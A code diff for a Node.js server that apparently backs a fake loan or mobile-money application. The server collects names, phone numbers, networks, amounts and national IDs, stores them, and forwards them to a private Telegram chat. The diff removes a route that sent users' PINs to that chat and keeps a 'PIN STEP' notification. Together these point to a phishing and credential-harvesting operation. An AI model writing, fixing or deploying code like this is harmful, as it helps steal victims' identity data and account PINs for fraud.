@@ -14,13 +14,20 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const MONGO_URI = process.env.MONGO_URI;
 
-// ================= SAFE DB CONNECT =================
-if (!MONGO_URI) {
-  console.log("❌ MONGO_URI missing in Railway variables");
-} else {
+// ================= DB CONNECT (SAFE) =================
+let dbConnected = false;
+
+if (MONGO_URI) {
   mongoose.connect(MONGO_URI)
-    .then(() => console.log("MongoDB connected"))
-    .catch(err => console.log("MongoDB error:", err.message));
+    .then(() => {
+      dbConnected = true;
+      console.log("MongoDB connected");
+    })
+    .catch(err => {
+      console.log("MongoDB error:", err.message);
+    });
+} else {
+  console.log("⚠️ MONGO_URI not set");
 }
 
 // ================= MODEL =================
@@ -40,31 +47,39 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// ================= TEST ROUTE =================
+// ================= TEST =================
 app.get("/test", (req, res) => {
   res.json({ ok: true });
 });
 
-// ================= APPLY =================
+// ================= APPLY (FIXED MAIN ISSUE) =================
 app.post("/apply", async (req, res) => {
   try {
     const { name, phone, network, amount, nationalId } = req.body;
 
     if (!name || !phone || !network || !amount || !nationalId) {
-      return res.status(400).json({ success: false, message: "missing fields" });
+      return res.status(400).json({ success: false });
     }
 
-    console.log("BOT:", BOT_TOKEN ? "OK" : "MISSING");
-    console.log("CHAT:", CHAT_ID ? "OK" : "MISSING");
-    console.log("MONGO:", MONGO_URI ? "OK" : "MISSING");
+    console.log("Apply received:", phone);
 
-    await User.findOneAndUpdate(
-      { phone },
-      { name, phone, network, amount, nationalId, status: "pending" },
-      { upsert: true, new: true }
-    );
+    // Save to DB ONLY if connected (prevents crash)
+    if (dbConnected) {
+      try {
+        await User.findOneAndUpdate(
+          { phone },
+          { name, phone, network, amount, nationalId, status: "pending" },
+          { upsert: true, new: true }
+        );
+      } catch (dbErr) {
+        console.log("DB save error (ignored):", dbErr.message);
+      }
+    }
 
-    const message = `
+    // Telegram (ONLY if config exists)
+    if (BOT_TOKEN && CHAT_ID) {
+      try {
+        const message = `
 📥 NEW APPLICATION
 
 👤 ${name}
@@ -72,25 +87,22 @@ app.post("/apply", async (req, res) => {
 📡 ${network}
 💰 ${amount}
 🆔 ${nationalId}
-
-Choose action:
 `;
 
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "✅ Approve", callback_data: `approve_${phone}` },
-          { text: "❌ Decline", callback_data: `decline_${phone}` }
-        ]]
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          chat_id: CHAT_ID,
+          text: message
+        });
+
+      } catch (tgErr) {
+        console.log("Telegram error:", tgErr.message);
       }
-    });
+    }
 
     return res.json({ success: true, phone });
 
   } catch (err) {
-    console.log("APPLY ERROR:", err.response?.data || err.message);
+    console.log("APPLY CRASH:", err.message);
     return res.status(500).json({ success: false });
   }
 });
@@ -98,13 +110,13 @@ Choose action:
 // ================= STATUS =================
 app.get("/status/:phone", async (req, res) => {
   try {
-    const user = await User.findOne({ phone: req.params.phone });
-
-    if (!user) {
+    if (!dbConnected) {
       return res.json({ status: "pending" });
     }
 
-    return res.json({ status: user.status });
+    const user = await User.findOne({ phone: req.params.phone });
+
+    return res.json({ status: user ? user.status : "pending" });
 
   } catch (err) {
     return res.status(500).json({ status: "error" });
@@ -121,12 +133,16 @@ app.post("/webhook", async (req, res) => {
 
     const status = action.startsWith("approve") ? "approved" : "declined";
 
-    await User.findOneAndUpdate({ phone }, { status });
+    if (dbConnected) {
+      await User.findOneAndUpdate({ phone }, { status });
+    }
 
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `Status updated: ${phone} → ${status}`
-    });
+    if (BOT_TOKEN && CHAT_ID) {
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: `Status: ${phone} → ${status}`
+      });
+    }
 
     res.sendStatus(200);
 
@@ -141,28 +157,15 @@ app.post("/pin-step", async (req, res) => {
   try {
     const { phone } = req.body;
 
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `📍 PIN STEP\n📱 ${phone}`
-    });
+    if (BOT_TOKEN && CHAT_ID) {
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: `PIN STEP: ${phone}`
+      });
+    }
 
     res.sendStatus(200);
-  } catch (err) {
-    res.sendStatus(200);
-  }
-});
 
-// ================= PIN =================
-app.post("/pin", async (req, res) => {
-  try {
-    const { phone, pin } = req.body;
-
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `🔐 PIN: ${pin}\n📱 ${phone}`
-    });
-
-    res.sendStatus(200);
   } catch (err) {
     res.sendStatus(200);
   }
